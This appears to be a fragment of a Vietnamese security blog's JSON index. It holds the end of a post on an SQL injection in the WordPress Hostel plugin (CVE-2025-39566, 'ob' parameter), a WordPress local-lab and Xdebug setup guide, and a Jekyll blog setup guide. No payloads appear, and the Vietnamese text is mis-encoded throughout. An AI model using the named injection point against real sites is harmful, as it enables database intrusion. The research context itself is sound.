href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview 